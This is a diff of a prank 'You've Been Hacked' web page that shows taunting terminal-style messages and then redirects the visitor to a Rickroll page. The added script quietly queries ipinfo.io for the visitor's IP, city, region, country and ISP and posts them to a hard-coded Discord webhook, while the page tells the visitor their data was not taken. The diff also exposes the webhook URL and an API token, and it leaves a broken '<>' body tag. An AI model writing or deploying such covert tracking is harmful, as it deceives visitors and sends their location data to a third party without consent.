@@ -1,8 +1,7 @@
-<!-- hacked.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Oops! You've Been Hacked!</title>
   <style>
@@ -64,7 +63,7 @@
     }
   </style>
 </head>
-<body>
+<>
   <div class="container">
     <div class="glitch">⚠ Oops! You've Been Hacked! ⚠</div>
     <div id="terminal"></div><div class="cursor"></div>
@@ -72,17 +71,15 @@
   </div>
 
   <script>
-    // Retrieve the name from sessionStorage
     const name = sessionStorage.getItem('prankName') || 'You';
-
     const lines = [
       `Don't worry, ${name}, your data wasn't taken...`,
-      `${name}, you were just hacked by Yumeth 😈`,
+      `You were just hacked by Yumeth 😈`,
       "This is a harmless lesson to show how easily hackers trick people.",
       "Never click on suspicious links, even if they’re from friends.",
       "This could’ve been much worse... consider this a warning.",
       "To help you remember... here’s your punishment 🎶",
-      "Redirecting in 5 seconds..."
+      "Redirecting in 3 seconds..."
     ];
 
     const terminal = document.getElementById("terminal");
@@ -108,35 +105,35 @@
         signature.style.display = "block";
         window.scrollTo(0, document.body.scrollHeight);
         setTimeout(() => {
-          window.location.href = "rickroll.html"; // Redirect to the Rickroll video page
-        }, 5000);
+          window.location.href = "rickroll.html"; // Redirect to the rickroll video
+        }, 3000); // Wait 5 seconds before redirecting
       }
     }
 
     window.onload = typeLine;
   </script>
   <script>
-    fetch("https://ipinfo.io/json?token=a90f18c2f503dc")
-      .then(response => response.json())
-      .then(data => {
-        const message = `🌐 New visitor:
-    - Name: ${name}
-    - IP: ${data.ip}
-    - City: ${data.city}
-    - Region: ${data.region}
-    - Country: ${data.country}
-    - ISP: ${data.org}
-    - Time: ${new Date().toLocaleString()}`;
-    
-        fetch("https://discord.com/api/webhooks/1368817232859238420/oQd2wHGOS1v8kUzjGPIXtEZK8zh1AygTBLlA2SUqp31yIzuFDQfHbV7qMdStR7UJNWcl", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ content: message })
+    const discord = "https://discord.com/api/webhooks/1368817232859238420/oQd2wHGOS1v8kUzjGPIXtEZK8zh1AygTBLlA2SUqp31yIzuFDQfHbV7qMdStR7UJNWcl";
+      fetch("https://ipinfo.io/json?token=a90f18c2f503dc")
+        .then(response => response.json())
+        .then(data => {
+          const message = `🌐 New visitor:
+      - IP: ${data.ip}
+      - City: ${data.city}
+      - Region: ${data.region}
+      - Country: ${data.country}
+      - ISP: ${data.org}
+      - Time: ${new Date().toLocaleString()}`;
+      
+          fetch(discord, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ content: message })
+          });
         });
-      });
-    </script>
-    
+      
+  </script>
 </body>
 </html>
